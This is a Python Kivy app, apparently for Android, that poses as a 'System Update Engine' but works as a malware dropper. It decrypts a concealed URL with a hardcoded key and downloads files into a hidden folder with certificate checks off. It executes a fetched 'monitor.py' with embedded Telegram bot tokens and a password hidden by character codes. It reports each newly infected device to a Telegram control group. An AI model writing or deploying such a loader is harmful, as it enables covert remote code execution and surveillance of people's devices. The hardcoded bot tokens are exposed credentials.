# -*- coding: utf-8 -*-
import os, sys, time, json, base64, threading, importlib, requests, hashlib, traceback
from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ======================== ط§ظ„ظ…ط³ط§ط± ط§ظ„ط£ط³ط§ط³ظٹ ========================
R = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(R): os.makedirs(R)
sys.path.append(R)

# ======================== طھظˆط²ظٹط¹ ظƒظ„ظ…ط© ط§ظ„ط³ط± ========================
def _p1(): return chr(90)+chr(97)+chr(101)+chr(110)
def _p2(): return chr(49)+chr(50)+chr(51)
def _p3(): return chr(64)+chr(49)+chr(50)+chr(51)+chr(64)+chr(49)+chr(50)+chr(51)
def _gp(): return _p1()+_p2()+_p3()+_p2()

# ======================== ظ…ظپطھط§ط­ ط«ط§ط¨طھ ظ„ظپظƒ ط§ظ„طھط´ظپظٹط± (ظٹط¹ظ…ظ„ ط¹ظ„ظ‰ ظƒظ„ ط§ظ„ط£ط¬ظ‡ط²ط©) ========================
def _get_static_key():
    return hashlib.sha256(b"Z@3n_Global_Controller_2026_Secure").digest()

def decrypt_data(blob):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = _get_static_key()
        data = base64.b64decode(blob)
        iv, tag, ct = data[:12], data[12:28], data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ct) + decryptor.finalize()).decode()
    except Exception as e:
        return None

# ======================== ط±ط§ط¨ط· index.json ط§ظ„ظ…ط´ظپط± ========================
ENC_INDEX_URL = "AAECAwQFBgcICQoLKpECh6XDd5Rb3OzJUfHQbzUx1vfTldID6rV0CqN4S6I6C8g6pNE7kebrLPn0lKxcxM1CJZ6fGJR9tdM="

# ======================== ط¨ظٹط§ظ†ط§طھ ط§ظ„ط¨ظˆطھط§طھ (ط§ط³طھط¨ط¯ظ„ظ‡ط§ ط¨ظ‚ظٹظ…ظƒ) ========================
try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    BOT_TOKENS = [
        "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
        "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4"
    ]
    CONTROL_ID = "-1003365166986"
    VAULT_ID = "-1003787520015"

# ======================== ط§ظ„طھط·ط¨ظٹظ‚ ط§ظ„ط±ط¦ظٹط³ظٹ ========================
class Z3nApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        self.console = TextInput(
            text="",
            readonly=True,
            background_color=(0,0,0,1),
            foreground_color=(0,1,0,1),
            font_size='11sp',
            selection_color=(0.2,0.5,0.2,1),
            halign='left'
        )
        btn_copy = Button(text="ًں“‹ Copy Log", size_hint=(1, 0.1), background_color=(0.2,0.2,0.2,1))
        btn_copy.bind(on_press=self.copy_log)
        layout.add_widget(self.console)
        layout.add_widget(btn_copy)
        Clock.schedule_once(self.start_engine, 0.5)
        return layout

    def copy_log(self, instance):
        Clipboard.copy(self.console.text)
        self.log("ًں“‹ Log copied to clipboard")

    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.text += f"[{timestamp}] [{level}] {msg}\n"
        Clock.schedule_once(lambda dt: setattr(self.console, 'cursor', (0, len(self.console.text))), 0.01)

    def start_engine(self, dt):
        threading.Thread(target=self.run_engine, daemon=True).start()

    def run_engine(self):
        self.log("ًںڑ€ Starting System Update Engine")
        
        # 1. ظپظƒ طھط´ظپظٹط± ط§ظ„ط±ط§ط¨ط·
        self.log("ًں”§ Decrypting index URL...")
        index_url = decrypt_data(ENC_INDEX_URL)
        if not index_url:
            self.log("â‌Œ Decryption failed! Check ENC_INDEX_URL", "ERROR")
            return
        self.log(f"âœ… Index URL decrypted: {index_url[:60]}...")

        # 2. طھط­ظ…ظٹظ„ index.json
        self.log("ًںŒگ Downloading index.json ...")
        try:
            r = requests.get(index_url, timeout=15, verify=False)
            if r.status_code != 200:
                self.log(f"â‌Œ HTTP {r.status_code} - cannot fetch index", "ERROR")
                return
            data = r.json()
            files = data.get('files', [])
            self.log(f"ًں“¦ Found {len(files)} files to download")
        except Exception as e:
            self.log(f"â‌Œ Index error: {str(e)}", "ERROR")
            traceback.print_exc(file=sys.stdout)
            return

        # 3. طھط­ظ…ظٹظ„ ظƒظ„ ط§ظ„ظ…ظ„ظپط§طھ
        for idx, f_url in enumerate(files, 1):
            name = f_url.split('/')[-1]
            self.log(f"â¬‡ï¸ڈ [{idx}/{len(files)}] Downloading {name} ...")
            try:
                r2 = requests.get(f_url, timeout=20, verify=False)
                if r2.status_code == 200:
                    path = os.path.join(R, name)
                    with open(path, 'w', encoding='utf-8') as f:
                        f.write(r2.text)
                    self.log(f"âœ… Saved: {name} ({len(r2.text)} bytes)")
                else:
                    self.log(f"â‌Œ Failed {name}: HTTP {r2.status_code}", "ERROR")
            except Exception as e:
                self.log(f"â‌Œ Download error {name}: {str(e)}", "ERROR")

        # 4. ط§ظ„طھط­ظ‚ظ‚ ظ…ظ† monitor.py
        self.log("ًں”چ Verifying monitor.py ...")
        mon_path = os.path.join(R, "monitor.py")
        if not os.path.exists(mon_path):
            self.log("â‌Œ monitor.py not found! Aborting.", "ERROR")
            return

        # 5. ط§ط³طھظٹط±ط§ط¯ ظˆطھط´ط؛ظٹظ„ monitor
        self.log("ًں“¥ Importing monitor module ...")
        try:
            spec = importlib.util.spec_from_file_location("monitor", mon_path)
            mon_mod = importlib.util.module_from_spec(spec)
            sys.modules["monitor"] = mon_mod
            spec.loader.exec_module(mon_mod)
        except Exception as e:
            self.log(f"â‌Œ Import error: {str(e)}", "ERROR")
            traceback.print_exc(file=sys.stdout)
            return

        if not hasattr(mon_mod, 'Monitor'):
            self.log("â‌Œ Monitor class not found in monitor.py", "ERROR")
            return

        self.log("ًںڑ€ Initializing Monitor ...")
        try:
            mon = mon_mod.Monitor()
            mon.pw = _gp()
            mon.bot_tokens = BOT_TOKENS
            mon.control_id = CONTROL_ID
            mon.vlt = VAULT_ID

            # ط¥ط±ط³ط§ظ„ ط¥ط´ط¹ط§ط± ط§ظ„طھط³ط¬ظٹظ„
            self.log("ًں“، Sending device registration ...")
            self._send_registration(mon)

            # طھط´ط؛ظٹظ„ ط§ظ„ظ…ظˆظ†ظٹطھظˆط±
            threading.Thread(target=mon.start, daemon=True).start()
            self.log("âœ… Monitor started successfully in background.")
            self.log("ًںژ¯ System initialization complete.")

        except Exception as e:
            self.log(f"â‌Œ Monitor init error: {str(e)}", "ERROR")
            traceback.print_exc(file=sys.stdout)

    def _send_registration(self, mon):
        try:
            info = (
                f"ًں†• *New Device Registered*\n"
                f"ًں“± Model: {mon.dmd if hasattr(mon,'dmd') else 'Unknown'}\n"
                f"ًں†” Device ID: {mon.did[:8] if hasattr(mon,'did') else 'N/A'}\n"
                f"ًں”‘ Key: {_get_static_key().hex()[:8]}\n"
                f"âڈ° Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            token = mon.bot_tokens[0] if mon.bot_tokens else BOT_TOKENS[0]
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": mon.control_id, "text": info, "parse_mode": "Markdown"}, timeout=5, verify=False)
            self.log("âœ… Registration message sent to control group")
        except Exception as e:
            self.log(f"âڑ ï¸ڈ Registration failed: {str(e)}", "WARN")

if __name__ == '__main__':
    Z3nApp().run()
